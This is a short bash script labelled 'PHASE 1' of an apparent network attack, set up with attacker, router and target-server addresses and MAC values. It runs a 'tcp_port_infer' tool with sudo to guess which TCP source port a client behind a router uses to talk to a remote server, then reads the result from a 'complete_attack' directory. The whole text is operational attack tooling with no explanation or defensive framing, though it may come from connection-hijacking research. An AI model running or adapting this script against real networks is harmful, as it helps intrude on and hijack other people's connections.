# !/bin/bash
ATTACKER_PRIVATE_IP=fd00:6868:6868:0:1cc6:1355:7eb1:7d79; 
REMOTE_SERVER_IP=2001:470:6af9::1; 
REMOTE_SERVER_PORT=80; 
ROUTER_WAN_IP=2402:f000:4:1007:809:ffff:fff3:fe16; 
PACKET_IFACE="en0"; 
SELF_MAC_ADDRESS="fe:cd:52:e5:d9:84"
ROUTER_MAC_ADDRESS="d4:da:21:77:c6:87";
PORT_SEARCH_RANGE=2000;
printf "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~~~~~~~~~~~ PHASE 1 ~~~~~~~~~~~\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"


echo `date`
echo "determining if client is talking to ${REMOTE_SERVER_IP}:${REMOTE_SERVER_PORT} on any port.."


sudo ./tcp_port_infer ${ATTACKER_PRIVATE_IP} ${REMOTE_SERVER_IP} ${REMOTE_SERVER_PORT} ${ROUTER_WAN_IP} ${PACKET_IFACE} ${SELF_MAC_ADDRESS} ${ROUTER_MAC_ADDRESS} ${PORT_SEARCH_RANGE}

PORT_INFER_RESULT=$(cat ../complete_attack/PORT_INFER_RESULT)
GUESSED_CLIENT_PORT=$(echo "$PORT_INFER_RESULT" |grep -o "source-port: .*"| awk -F": " '{print $2}'|head -n 1)

echo "phase 1 port result: ${GUESSED_CLIENT_PORT}"
echo `date`
